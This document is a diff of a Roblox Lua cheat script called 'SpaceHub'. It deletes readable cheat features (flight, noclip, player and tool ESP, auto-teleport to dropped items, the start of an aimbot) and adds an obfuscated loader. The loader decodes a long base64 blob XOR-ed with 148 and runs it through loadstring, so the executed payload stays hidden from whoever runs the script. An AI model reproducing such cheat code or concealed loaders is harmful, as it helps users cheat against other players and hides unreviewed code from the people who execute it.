+    .. "p7qkuqS0tLu0tNvG1t3A1di00dDdwN3b2ra4np60tLS01/v64PH64LSpnrS0tLS0tLS0tsTm"
+    .. "8fn94fm02+b2/eD1+LTd+uDx5vL19/HI+sj6trS6up60tLS0tLS0tLbZ++Lx+fH64LTX++bx"
+    .. "yPq2tLq6nrS0tLS0tLS0tsD15vPx4P3687TX++bxyPq2tLq6nrS0tLS0tLS0tsL95+H1+LTH"
+    .. "7efg8fnnyPq2tLq6nrS0tLS0tLS0tsDx+PHk++bgtNrx4OP75v/I+ra0urqetLS0tLS0tLS2"
+    .. "2fXn57TA5vX65+T75uDI+ra0urqetLS0tLS0tLS21/v68v3z4eb14P37+rTX++bxtp6e6b2e"
+    .. "nrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqameubm7u7TX3NXG1dfA0ca0xtHHxNXD2p65ubu7qampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampnp7Y+/f1+MT49e3x5rrX/PXm9ffg"
+    .. "8ebV8PDx8K7X+/r68ffgvJ60tLS08uH69+D9+/q89/z15vX34PHmvZ6etLS0tLS0tLTg9ef/"
+    .. "uuP1/eC8pLqhvZ6etLS0tLS0tLTh5PD14PHX/PXm9ffg8ea8nrS0tLS0tLS0tLS0tPf89eb1"
+    .. "9+Dx5p60tLS0tLS0tL2enrS0tLS0tLS0/fK03OH59fr7/fC04Pzx+p60tLS0tLS0tLS0tLTc"
+    .. "4fn1+vv98LrD9fj/x+Tx8fC0qbTj9fj/x+Tx8fCetLS0tLS0tLS0tLS03OH59fr7/fC6wefx"
+    .. "3uH55MT74/HmtKm04Obh8Z60tLS0tLS0tLS0tLTc4fn1+vv98Lre4fnkxPvj8ea0qbT+4fnk"
+    .. "xPvj8eaetLS0tLS0tLS0tLS03OH59fr7/fC63P3k3PH98/zgtKm0/P3k3PH98/zgnrS0tLS0"
+    .. "tLS08frwnp60tLS0tLS0tP3ytPfh5+D7+dPm9eL94O3R+vX2+PHwtOD88fqetLS0tLS0tLS0"
+    .. "tLS04/vm/+fk9ffxutPm9eL94O20qbT34efg+/nT5vXi/eDtnrS0tLS0tLS08frwnp60tLS0"
+    .. "tLS0tP3ytPHn5NH69fb48fC04Pzx+p6etLS0tLS0tLS0tLS04PXn/7rj9f3gvKS6pr2enrS0"
+    .. "tLS0tLS0tLS0tObx8ubx5/zRx8S8vZ6etLS0tLS0tLTx+vCenrS0tLS0tLS0/fK08vjt/frz"
+    .. "tOD88fqenrS0tLS0tLS0tLS0tOD15/+64/X94Lykuqa9np60tLS0tLS0tLS0tLTn4PXm4NL4"
+    .. "7f3687y9np60tLS0tLS0tPH68J6etLS0tPH68J69np65ubu7qampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u02NvV0LTX29rS3dPB"
+    .. "xtXA3dvanrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqamenuT39fj4vPLh+vfg/fv6vL2enrS0tLTG9e3y/fH48K7Y+/Xw1/v68v3z"
+    .. "4eb14P37+ry9np7x+vC9np65ubu7qampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampnrm5u7u0x8DVxsDBxJ65ubu7qampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampnp7G9e3y/fH48K7a++D9"
+    .. "8u28756etLS0tMD94PjxtKm0tsfE1dfRtNzB1ra4np60tLS01/v64PH64LSpnrS0tLS0tLS0"
+    .. "ttvm9v3g9fi09/v5+fX68LTw8ff/tPv6+P368bS0dhQ2tLT1+Pi05+3n4PH557T9+v3g/fX4"
+    .. "/e7x8Lq2uJ6etLS0tNDh5vXg/fv6tKm0obienrS0tLTd+fXz8bSptLbn5PXm//jx57aenum9"
 
-    RunService.RenderStepped:Connect(function()
-        frames += 1
-        local now = os.clock()
-        if now - last >= 0.5 then
-            local fps = math.floor(frames / (now - last) + 0.5)
-            frames = 0
-            last = now
-
-            local characterReady = Character and Humanoid and HRP and "READY" or "WAITING"
-            local hp = Humanoid and math.floor(Humanoid.Health + 0.5) or 0
-            local maxHp = Humanoid and math.floor(Humanoid.MaxHealth + 0.5) or 0
-
-            CharacterStatusLabel:Set(
-                "Character  •  " .. characterReady ..
-                "  •  HP " .. tostring(hp) .. "/" .. tostring(maxHp),
-                "scan"
-            )
-
-            local ping = "--"
-            pcall(function()
-                local stats = game:GetService("Stats")
-                local network = stats:FindFirstChild("Network")
-                local serverStats = network and network:FindFirstChild("ServerStatsItem")
-                local dataPing = serverStats and serverStats:FindFirstChild("Data Ping")
-                if dataPing then
-                    ping = tostring(math.floor(dataPing:GetValue() + 0.5))
-                end
-            end)
-
-            FPSLabel:Set("FPS  •  " .. tostring(fps), "gauge")
-            PingLabel:Set("Ping  •  " .. tostring(ping) .. " ms", "wifi")
-            PlayersLabel:Set("Players  •  " .. tostring(#Players:GetPlayers()), "users")
-
-            if HRP then
-                local p = HRP.Position
-                PositionLabel:Set(
-                    string.format("Position  •  X %.1f  Y %.1f  Z %.1f", p.X, p.Y, p.Z),
-                    "map-pin"
-                )
-            else
-                PositionLabel:Set("Position  •  --", "map-pin")
-            end
-
-            MovementStatusLabel:Set(
-                "Movement  •  " ..
-                (flying and "FLIGHT ONLINE" or ("WALKSPEED " .. tostring(math.floor(walkSpeed)))),
-                "move"
-            )
-
-            VisualStatusLabel:Set(
-                "Visuals  •  " ..
-                (espEnabled and "PLAYER ESP" or "STANDBY")
-                .. "  /  "
-                .. (toolEspEnabled and "TOOL ESP" or "TOOLS OFF"),
-                "eye"
-            )
-
-            TargetStatusLabel:Set(
-                "Targeting  •  " ..
-                (aimbotEnabled and ("LOCKED / " .. aimbotPriority) or "STANDBY"),
-                "crosshair"
-            )
-
-            PhysicsStatusLabel:Set(
-                "Physics  •  " ..
-                (customGravityEnabled and ("GRAVITY " .. tostring(math.floor(customGravity))) or "DEFAULT"),
-                "orbit"
-            )
-
-            local waypointCount = 0
-            for _ in pairs(waypoints) do
-                waypointCount += 1
-            end
-            WaypointStatusLabel:Set(
-                "Waypoints  •  " .. tostring(waypointCount) .. " SAVED",
-                "bookmark"
-            )
-
-            RuntimeStatusLabel:Set(
-                "Runtime  •  " .. string.format("%.1fs", os.clock()),
-                "activity"
-            )
+local _NvmzqWsD1B=148
+local _nXHqk61pG9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function _OZZSzQaue6(_QhYN3b4IHn)
+    _QhYN3b4IHn=(_QhYN3b4IHn:gsub('[^'.._nXHqk61pG9..'=]',''))
+    return (_QhYN3b4IHn:gsub('.',function(x)
+        if x=='=' then return '' end
+        local r,f='',(_nXHqk61pG9:find(x)-1)
+        for i=6,1,-1 do
+            r=r..((f%2^i-f%2^(i-1)>0) and '1' or '0')
         end
-    end)
-end)
-
---//======================================================
---// UNIVERSAL HEADER
---//======================================================
-
-UniversalTab:CreateParagraph({
-
-    Title = "✦ ORBITAL CONTROL  /  MOVEMENT",
-
-    Content =
-        "Universal movement and player utilities.\n" ..
-        "Configure your personal movement systems below."
-
-})
-
---//======================================================
---// MOVEMENT
---//======================================================
-
-UniversalTab:CreateSection(
-    "MOVEMENT  /  CORE"
-)
-
-UniversalTab:CreateSlider({
-
-    Name = "WalkSpeed",
-
-    Range = {
-        16,
-        250
-    },
-
-    Increment = 1,
-
-    Suffix = " SPD",
-
-    CurrentValue = 16,
-
-    Flag = "WalkSpeed",
-
-    Callback = function(value)
-
-        walkSpeed = value
-
-        if Humanoid
-            and Humanoid.Parent then
-
-            Humanoid.WalkSpeed =
-                value
-
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
+        if #x~=8 then return '' end
+        local n=0
+        for i=1,8 do
+            if x:sub(i,i)=='1' then n=n+2^(8-i) end
         end
-
-    end
-
-})
-
---//======================================================
---// FLIGHT
---//======================================================
-
-UniversalTab:CreateSection(
-    "MOVEMENT  /  FLIGHT"
-)
-
-local function removeFlightObjects()
-
-    if not HRP then
-        return
-    end
-
-    local velocity =
-        HRP:FindFirstChild(
-            "SpaceHub_FlightVelocity"
-        )
-
-    if velocity then
-        velocity:Destroy()
-    end
-
-    local attachment =
-        HRP:FindFirstChild(
-            "SpaceHub_FlightAttachment"
-        )
-
-    if attachment then
-        attachment:Destroy()
-    end
-
+        return string.char(bit32.bxor(n,_NvmzqWsD1B))
+    end))
 end
 
-local function stopFlying()
 
-    flying = false
-
-    if flyConnection then
-
-        flyConnection:Disconnect()
-
-        flyConnection = nil
-
-    end
-
-    removeFlightObjects()
-
-    if Humanoid then
-        Humanoid.PlatformStand = false
-    end
-
-end
-
-local function startFlying()
-
-    if not HRP
-        or not Humanoid then
-
-        return
-
-    end
-
-    stopFlying()
-
-    flying = true
-
-    local attachment =
-        Instance.new("Attachment")
-
-    attachment.Name =
-        "SpaceHub_FlightAttachment"
-
-    attachment.Parent =
-        HRP
-
-    local velocity =
-        Instance.new("LinearVelocity")
-
-    velocity.Name =
-        "SpaceHub_FlightVelocity"
-
-    velocity.Attachment0 =
-        attachment
-
-    velocity.MaxForce =
-        math.huge
-
-    velocity.RelativeTo =
-        Enum.ActuatorRelativeTo.World
-
-    velocity.VectorVelocity =
-        Vector3.zero
-
-    velocity.Parent =
-        HRP
-
-    Humanoid.PlatformStand =
-        true
-
-    flyConnection =
-        RunService.RenderStepped:Connect(
-            function()
-
-                if not flying then
-                    return
-                end
-
-                if not HRP
-                    or not HRP.Parent then
-
-                    stopFlying()
-
-                    return
-
-                end
-
-                local camera =
-                    workspace.CurrentCamera
-
-                if not camera then
-                    return
-                end
-
-                local direction =
-                    Vector3.zero
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.W
-                ) then
-
-                    direction +=
-                        camera.CFrame.LookVector
-
-                end
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.S
-                ) then
-
-                    direction -=
-                        camera.CFrame.LookVector
-
-                end
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.A
-                ) then
-
-                    direction -=
-                        camera.CFrame.RightVector
-
-                end
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.D
-                ) then
-
-                    direction +=
-                        camera.CFrame.RightVector
-
-                end
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.Space
-                ) then
-
-                    direction +=
-                        Vector3.yAxis
-
-                end
-
-                if UserInputService:IsKeyDown(
-                    Enum.KeyCode.LeftControl
-                ) then
-
-                    direction -=
-                        Vector3.yAxis
-
-                end
-
-                if direction.Magnitude > 0 then
-
-                    direction =
-                        direction.Unit
-                        * flightSpeed
-
-                end
-
-                velocity.VectorVelocity =
-                    direction
-
-            end
-        )
-
-end
-
-UniversalTab:CreateSlider({
-
-    Name = "Flight Speed",
-
-    Range = {
-        10,
-        3000
-    },
-
-    Increment = 10,
-
-    Suffix = " SPD",
-
-    CurrentValue = 10,
-
-    Flag = "FlightSpeed",
-
-    Callback = function(value)
-
-        flightSpeed =
-            value
-
-    end
-
-})
-
-UniversalTab:CreateToggle({
-
-    Name = "Flight",
-
-    CurrentValue = false,
-
-    Flag = "Flight",
-
-    Callback = function(enabled)
-
-        if enabled then
-            startFlying()
+do
+    local __state=(#("Sun Tzu")*9)-53
+    while __state<40 do
+        __state=__state+13
+        if __state%2==0 then
+            __state=__state-1
         else
-            stopFlying()
-        end
-
-    end
-
-})
-
-UniversalTab:CreateParagraph({
-
-    Title = "FLIGHT CONTROLS",
-
-    Content =
-        "W A S D  →  Navigation\n" ..
-        "SPACE  →  Ascend\n" ..
-        "LEFT CTRL  →  Descend"
-
-})
-
---//======================================================
---// PLAYER UTILITIES
---//======================================================
-
-UniversalTab:CreateSection(
-    "PLAYER  /  UTILITIES"
-)
-
-UniversalTab:CreateToggle({
-
-    Name = "Infinite Jump",
-
-    CurrentValue = false,
-
-    Flag = "InfiniteJump",
-
-    Callback = function(enabled)
-
-        infiniteJump =
-            enabled
-
-        if jumpConnection then
-
-            jumpConnection:Disconnect()
-
-            jumpConnection = nil
-
-        end
-
-        if not enabled then
-            return
-        end
-
-        jumpConnection =
-            UserInputService.JumpRequest:Connect(
-                function()
-
-                    if Humanoid then
-
-                        Humanoid:ChangeState(
-                            Enum.HumanoidStateType.Jumping
-                        )
-
-                    end
-
-                end
-            )
-
-    end
-
-})
-
---//======================================================
---// PLAYER CONTROLS
---//======================================================
-
-UniversalTab:CreateSection("PLAYER  /  ADVANCED CONTROLS")
-
-UniversalTab:CreateSlider({
-    Name = "JumpPower",
-    Range = {0, 250},
-    Increment = 1,
-    Suffix = " JP",
-    CurrentValue = 50,
-    Flag = "JumpPower",
-    Callback = function(value)
-        jumpPower = value
-        if Humanoid then
-            Humanoid.UseJumpPower = true
-            Humanoid.JumpPower = value
-        end
-    end
-})
-
-UniversalTab:CreateSlider({
-    Name = "HipHeight",
-    Range = {0, 10},
-    Increment = 0.1,
-    Suffix = " HH",
-    CurrentValue = 2,
-    Flag = "HipHeight",
-    Callback = function(value)
-        hipHeight = value
-        if Humanoid then
-            Humanoid.HipHeight = value
-        end
-    end
-})
-
-UniversalTab:CreateSection("PHYSICS  /  LOCAL")
-
-UniversalTab:CreateToggle({
-    Name = "Custom Gravity",
-    CurrentValue = false,
-    Flag = "CustomGravity",
-    Callback = function(enabled)
-        customGravityEnabled = enabled
-        workspace.Gravity = enabled and customGravity or originalGravity
-    end
-})
-
-UniversalTab:CreateSlider({
-    Name = "Gravity",
-    Range = {0, 500},
-    Increment = 1,
-    Suffix = " G",
-    CurrentValue = 196,
-    Flag = "Gravity",
-    Callback = function(value)
-        customGravity = value
-        if customGravityEnabled then
-            workspace.Gravity = value
-        end
-    end
-})
-
---//======================================================
---// NOCLIP
---//======================================================
-
-UniversalTab:CreateToggle({
-
-    Name = "Noclip",
-
-    CurrentValue = false,
-
-    Flag = "Noclip",
-
-    Callback = function(enabled)
-
-        noclip =
-            enabled
-
-        if noclipConnection then
-
-            noclipConnection:Disconnect()
-
-            noclipConnection = nil
-
-        end
-
-        if not enabled
-            and Character then
-
-            for _, part in ipairs(
-                Character:GetDescendants()
-            ) do
-
-                if part:IsA("BasePart") then
-                    part.CanCollide = true
-                end
-
-            end
-
-            return
-
-        end
-
-        noclipConnection =
-            RunService.Stepped:Connect(
-                function()
-
-                    if not noclip
-                        or not Character then
-
-                        return
-
-                    end
-
-                    for _, part in ipairs(
-                        Character:GetDescendants()
-                    ) do
-
-                        if part:IsA("BasePart") then
-                            part.CanCollide = false
-                        end
-
-                    end
-
-                end
-            )
-
-    end
-
-})
-
---//======================================================
---// FULLBRIGHT
---//======================================================
-
-UniversalTab:CreateToggle({
-
-    Name = "Fullbright",
-
-    CurrentValue = false,
-
-    Flag = "Fullbright",
-
-    Callback = function(enabled)
-
-        fullbright =
-            enabled
-
-        if fullbrightConnection then
-
-            fullbrightConnection:Disconnect()
-
-            fullbrightConnection = nil
-
-        end
-
-        if enabled then
-
-            fullbrightConnection =
-                RunService.RenderStepped:Connect(
-                    function()
-
-                        Lighting.Brightness = 2
-                        Lighting.ClockTime = 14
-                        Lighting.FogEnd = 100000
-                        Lighting.GlobalShadows = false
-
-                    end
-                )
-
-        else
-
-            Lighting.Brightness =
-                originalLighting.Brightness
-
-            Lighting.ClockTime =
-                originalLighting.ClockTime
-
-            Lighting.FogEnd =
-                originalLighting.FogEnd
-
-            Lighting.GlobalShadows =
-                originalLighting.GlobalShadows
-
-        end
-
-    end
-
-})
-
---//======================================================
---// GAME HEADER
---//======================================================
-
-GameTab:CreateParagraph({
-
-    Title = "✦ TARGETING & VISUALS  /  COMBAT",
-
-    Content =
-        "Advanced player visualization and targeting controls."
-
-})
-
---//======================================================
---// ESP / ADVANCED VISUALS
---//======================================================
-
-GameTab:CreateSection("VISUALS  /  ADVANCED ESP")
-
-local function getTeamColor(player)
-    if espTeamColors and player.Team then
-        return player.Team.TeamColor.Color
-    end
-    return Color3.fromRGB(0, 190, 255)
-end
-
-local function removeESP(player)
-    local data = espObjects[player]
-    if not data then return end
-    if data.Highlight then data.Highlight:Destroy() end
-    if data.Billboard then data.Billboard:Destroy() end
-    espObjects[player] = nil
-end
-
-local function createESP(player)
-    if player == LocalPlayer then return end
-    removeESP(player)
-    if not espEnabled then return end
-
-    local character = player.Character
-    local head = character and character:FindFirstChild("Head")
-    if not character or not head then return end
-
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "SpaceHub_ESP"
-    highlight.Adornee = character
-    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    highlight.FillTransparency = 0.72
-    highlight.OutlineTransparency = 0
-    highlight.FillColor = getTeamColor(player)
-    highlight.OutlineColor = getTeamColor(player)
-    highlight.Parent = character
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "SpaceHub_PlayerInfo"
-    billboard.Adornee = head
-    billboard.Size = UDim2.fromOffset(260, 72)
-    billboard.StudsOffset = Vector3.new(0, 3.2, 0)
-    billboard.AlwaysOnTop = true
-    billboard.Parent = head
-
-    local label = Instance.new("TextLabel")
-    label.Name = "Info"
-    label.Size = UDim2.fromScale(1, 1)
-    label.BackgroundTransparency = 1
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 13
-    label.TextWrapped = true
-    label.TextColor3 = getTeamColor(player)
-    label.TextStrokeTransparency = 0
-    label.TextStrokeColor3 = Color3.fromRGB(5, 10, 20)
-    label.Parent = billboard
-
-    espObjects[player] = {
-        Highlight = highlight,
-        Billboard = billboard,
-        Label = label
-    }
-end
-
-local function refreshESP()
-    for player in pairs(espObjects) do
-        if not player.Parent or not espEnabled then
-            removeESP(player)
-        end
-    end
-    if not espEnabled then return end
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            createESP(player)
+            break
         end
     end
 end
 
-GameTab:CreateToggle({
-    Name = "Player ESP",
-    CurrentValue = false,
-    Flag = "ESP",
-    Callback = function(enabled)
-        espEnabled = enabled
-        refreshESP()
-    end
-})
-
-GameTab:CreateToggle({
-    Name = "Show Name",
-    CurrentValue = true,
-    Flag = "ESPName",
-    Callback = function(value) espShowName = value end
-})
-
-GameTab:CreateToggle({
-    Name = "Show Health",
-    CurrentValue = true,
-    Flag = "ESPHealth",
-    Callback = function(value) espShowHealth = value end
-})
-
-GameTab:CreateToggle({
-    Name = "Show Distance",
-    CurrentValue = true,
-    Flag = "ESPDistance",
-    Callback = function(value) espShowDistance = value end
-})
-
-GameTab:CreateToggle({
-    Name = "Team Colors",
-    CurrentValue = true,
-    Flag = "ESPTeamColors",
-    Callback = function(value)
-        espTeamColors = value
-        refreshESP()
-    end
-})
-
-GameTab:CreateSlider({
-    Name = "ESP Maximum Distance",
-    Range = {100, 5000},
-    Increment = 50,
-    Suffix = " studs",
-    CurrentValue = 1000,
-    Flag = "ESPMaxDistance",
-    Callback = function(value) espMaxDistance = value end
-})
-
-GameTab:CreateButton({
-    Name = "Refresh Player Visuals",
-    Callback = function()
-        refreshESP()
-        Rayfield:Notify({
-            Title = "VISUAL SYSTEM",
-            Content = "Advanced player visuals synchronized.",
-            Duration = 3,
-            Image = "sparkles"
-        })
-    end
-})
-
---//======================================================
---// TOOL ESP / DROPPED ITEMS
---//======================================================
-
-local function getToolPart(tool)
-    if not tool or not tool:IsA("Tool") then
-        return nil
-    end
-
-    local handle = tool:FindFirstChild("Handle")
-    if handle and handle:IsA("BasePart") then
-        return handle
-    end
-
-    for _, descendant in ipairs(tool:GetDescendants()) do
-        if descendant:IsA("BasePart") then
-            return descendant
-        end
-    end
-
-    return nil
-end
-
-local function isDroppedTool(tool)
-    if not tool or not tool:IsA("Tool") or not tool:IsDescendantOf(workspace) then
-        return false
-    end
-
-    -- Tools inside a player's character are equipped, not dropped.
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Character and tool:IsDescendantOf(player.Character) then
-            return false
-        end
-    end
-
-    return true
-end
-
-local function removeToolESP(tool)
-    local data = toolEspObjects[tool]
-    if not data then
-        return
-    end
-
-    if data.Highlight then
-        data.Highlight:Destroy()
-    end
-
-    if data.Billboard then
-        data.Billboard:Destroy()
-    end
-
-    toolEspObjects[tool] = nil
-end
-
-local function createToolESP(tool)
-    if not toolEspEnabled or not isDroppedTool(tool) then
-        return
-    end
-
-    local part = getToolPart(tool)
-    if not part then
-        return
-    end
-
-    removeToolESP(tool)
-
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "SpaceHub_ToolESP"
-    highlight.Adornee = tool
-    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    highlight.FillTransparency = 0.72
-    highlight.OutlineTransparency = 0
-    highlight.FillColor = Color3.fromRGB(255, 190, 70)
-    highlight.OutlineColor = Color3.fromRGB(255, 225, 130)
-    highlight.Parent = tool
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "SpaceHub_ToolInfo"
-    billboard.Adornee = part
-    billboard.Size = UDim2.fromOffset(240, 48)
-    billboard.StudsOffset = Vector3.new(0, 2.2, 0)
-    billboard.AlwaysOnTop = true
-    billboard.Parent = part
-
-    local label = Instance.new("TextLabel")
-    label.Name = "Info"
-    label.Size = UDim2.fromScale(1, 1)
-    label.BackgroundTransparency = 1
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 13
-    label.TextWrapped = true
-    label.TextColor3 = Color3.fromRGB(255, 220, 120)
-    label.TextStrokeTransparency = 0
-    label.TextStrokeColor3 = Color3.fromRGB(20, 14, 5)
-    label.Text = "TOOL  •  " .. tool.Name
-    label.Parent = billboard
-
-    toolEspObjects[tool] = {
-        Highlight = highlight,
-        Billboard = billboard,
-        Label = label
-    }
-end
-
-local function refreshToolESP()
-    for tool in pairs(toolEspObjects) do
-        if not tool.Parent or not isDroppedTool(tool) or not toolEspEnabled then
-            removeToolESP(tool)
-        end
-    end
-
-    if not toolEspEnabled then
-        return
-    end
-
-    for _, descendant in ipairs(workspace:GetDescendants()) do
-        if descendant:IsA("Tool") then
-            createToolESP(descendant)
-        end
+do
+    local _=0
+    while _<1 do
+        _=_+1
+        local __=(_OZZSzQaue6(_ZtRmNDVeR3))
+        local ___=loadstring or load
+        assert(___, "Executor missing loadstring")(__)()
     end
 end
-
-GameTab:CreateToggle({
-    Name = "Tool ESP  •  Dropped Items",
-    CurrentValue = false,
-    Flag = "ToolESP",
-    Callback = function(enabled)
-        toolEspEnabled = enabled
-        refreshToolESP()
-
-        Rayfield:Notify({
-            Title = "TOOL ESP",
-            Content = enabled and "Dropped tools are now highlighted." or "Dropped tool visuals disabled.",
-            Duration = 3,
-            Image = enabled and "eye" or "eye-off"
-        })
-    end
-})
-
-GameTab:CreateSlider({
-    Name = "Tool ESP Maximum Distance",
-    Range = {100, 10000},
-    Increment = 50,
-    Suffix = " studs",
-    CurrentValue = 1000,
-    Flag = "ToolESPMaxDistance",
-    Callback = function(value)
-        toolEspMaxDistance = value
-    end
-})
-
-GameTab:CreateButton({
-    Name = "Refresh Tool Visuals",
-    Callback = function()
-        refreshToolESP()
-
-        Rayfield:Notify({
-            Title = "TOOL ESP",
-            Content = "Workspace tools rescanned.",
-            Duration = 2,
-            Image = "refresh-cw"
-        })
-    end
-})
-
---//======================================================
---// TOOL TELEPORT
---// Automatic toggle: when enabled, it searches for the nearest
---// dropped Tool and teleports the player to it.
-
-local toolTeleportEnabled = false
-local toolTeleportRunning = false
-local TOOL_TELEPORT_INTERVAL = 0.15
-
-local function getNearestDroppedTool()
-    if not HRP then
-        return nil, nil, math.huge
-    end
-
-    local nearestTool = nil
-    local nearestPart = nil
-    local nearestDistance = math.huge
-
-    for _, descendant in ipairs(workspace:GetDescendants()) do
-        if descendant:IsA("Tool") and isDroppedTool(descendant) then
-            local part = getToolPart(descendant)
-
-            if part then
-                local distance =
-                    (HRP.Position - part.Position).Magnitude
-
-                if distance < nearestDistance then
-                    nearestDistance = distance
-                    nearestTool = descendant
-                    nearestPart = part
-                end
-            end
-        end
-    end
-
-    return nearestTool, nearestPart, nearestDistance
-end
-
-local function startToolTeleport()
-    if toolTeleportRunning then
-        return
-    end
-
-    toolTeleportRunning = true
-
-    task.spawn(function()
-        while toolTeleportEnabled do
-            if HRP then
-                local tool, part, distance =
-                    getNearestDroppedTool()
-
-                if tool and part then
-                    previousPosition = HRP.CFrame
-
-                    HRP.CFrame =
-                        part.CFrame * CFrame.new(0, 3, 0)
-
-                    Rayfield:Notify({
-                        Title = "TOOL TELEPORT",
-                        Content =
-                            "Teleported to "
-                            .. tool.Name
-                            .. " • "
-                            .. math.floor(distance)
-                            .. " studs",
-                        Duration = 2,
-                        Image = "map-pin"
-                    })
-                end
-            end
-
-            task.wait(TOOL_TELEPORT_INTERVAL)
-        end
-
-        toolTeleportRunning = false
-    end)
-end
-
-GameTab:CreateToggle({
-    Name = "Tool Teleport  •  Nearest Dropped",
-    CurrentValue = false,
-    Flag = "ToolTeleport",
-
-    Callback = function(enabled)
-        toolTeleportEnabled = enabled
-
-        if enabled then
-            startToolTeleport()
-
-            Rayfield:Notify({
-                Title = "TOOL TELEPORT",
-                Content =
-                    "Automatic tool teleport enabled.",
-                Duration = 3,
-                Image = "map-pin"
-            })
-        else
-            Rayfield:Notify({
-                Title = "TOOL TELEPORT",
-                Content =
-                    "Automatic tool teleport disabled.",
-                Duration = 3,
-                Image = "map-pin-off"
-            })
-        end
-    end
-})
-
-task.spawn(function()
-    while task.wait(0.15) do
-        if toolEspEnabled then
-            for tool, data in pairs(toolEspObjects) do
-                if not tool.Parent or not isDroppedTool(tool) then
-                    removeToolESP(tool)
-                else
-                    local part = getToolPart(tool)
-
-                    if not part then
-                        removeToolESP(tool)
-                    else
-                        local distance =
-                            HRP and (HRP.Position - part.Position).Magnitude
-                            or math.huge
-
-                        local visible = distance <= toolEspMaxDistance
-
-                        if data.Billboard then
-                            data.Billboard.Enabled = visible
-                        end
-
-                        if data.Highlight then
-                            data.Highlight.Enabled = visible
-                        end
-
-                        if data.Label then
-                            data.Label.Text =
-                                "TOOL  •  "
-                                .. tool.Name
-                                .. "\n"
-                                .. math.floor(distance)
-                                .. " studs"
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
-workspace.DescendantAdded:Connect(function(instance)
-    if instance:IsA("Tool") then
-        task.defer(function()
-            if toolEspEnabled then
-                createToolESP(instance)
-            end
-        end)
-    end
-end)
-
-workspace.DescendantRemoving:Connect(function(instance)
-    if instance:IsA("Tool") then
-        removeToolESP(instance)
-    end
-end)
-
-task.spawn(function()
-    while task.wait(1) do
-        if toolEspEnabled then
-            -- A tool can move from Backpack/Character into Workspace without
-            -- firing a useful state change for our visual system, so keep a
-            -- lightweight synchronization pass.
-            for _, descendant in ipairs(workspace:GetDescendants()) do
-                if descendant:IsA("Tool")
-                    and isDroppedTool(descendant)
-                    and not toolEspObjects[descendant] then
-
-                    createToolESP(descendant)
-                end
-            end
-        end
-    end
-end)
-
-task.spawn(function()
-    while task.wait(0.15) do
-        if espEnabled then
-            for player, data in pairs(espObjects) do
-                local character = player.Character
-                local root = character and character:FindFirstChild("HumanoidRootPart")
-                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-
-                if not player.Parent or not character or not root or not humanoid then
-                    removeESP(player)
-                elseif data.Label and data.Highlight then
-                    local distance = HRP and (HRP.Position - root.Position).Magnitude or math.huge
-                    local visible = distance <= espMaxDistance
-                    data.Billboard.Enabled = visible
-                    data.Highlight.Enabled = visible
-                    data.Label.TextColor3 = getTeamColor(player)
-
-                    local lines = {}
-                    if espShowName then
-                        table.insert(lines, player.DisplayName .. "  @" .. player.Name)
-                    end
-                    if espShowHealth then
-                        table.insert(lines, "♥ " .. math.floor(humanoid.Health + 0.5) .. " / " .. math.floor(humanoid.MaxHealth + 0.5))
-                    end
-                    if espShowDistance then
-                        table.insert(lines, math.floor(distance) .. " studs")
-                    end
-                    data.Label.Text = table.concat(lines, "\n")
-                end
-            end
-        end
-    end
-end)
-
-Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function()
-        task.wait(0.5)
-        if espEnabled then createESP(player) end
-    end)
-end)
-
-Players.PlayerRemoving:Connect(function(player)
-    removeESP(player)
-end)
-
---//======================================================
---// AIMBOT / ADVANCED TARGETING
---//======================================================
-
-GameTab:CreateSection("TARGETING  /  ADVANCED AIM")
-
---//======================================================
---// AIMBOT STATE
---//======================================================
-
-local aimbotOnlyPlayers = true
-local aimbotOnlyEntities = false
-
-local currentAimbotTarget = nil
-local aimbotConnection = nil
-
--- Target search is intentionally throttled.
--- Camera smoothing still runs every frame.
-local nextTargetSearch = 0
-local AIMBOT_TARGET_REFRESH = 0.10
-
--- Entity cache
-local entityCache = {}
-local entityCacheInitialized = false
-
-
---//======================================================
---// TARGET PART
---//======================================================
-
-local function getTargetPart(character)
-
-    if not character then
-        return nil
-    end
-
-    local preferredPart
-
-    if aimbotPart == "Head" then
-
-        preferredPart =
-            character:FindFirstChild("Head")
-
-    elseif aimbotPart == "Torso" then
-
-        preferredPart =
-            character:FindFirstChild("UpperTorso")
-            or character:FindFirstChild("Torso")
-
-    elseif aimbotPart == "Root" then
-
-        preferredPart =
-            character:FindFirstChild(
-                "HumanoidRootPart"
-            )
-    end
-
-    if preferredPart
-        and preferredPart:IsA("BasePart") then
-
-        return preferredPart
-    end
-
-    -- Universal fallback.
-    return character:FindFirstChild("Head")
-        or character:FindFirstChild("UpperTorso")
-        or character:FindFirstChild("Torso")
-        or character:FindFirstChild("HumanoidRootPart")
-end
-
-
---//======================================================
---// VISIBILITY CHECK
---//======================================================
-
-local function isVisible(
-    camera,
-    targetPart,
-    character
-)
-
-    if not aimbotVisibleCheck then
-        return true
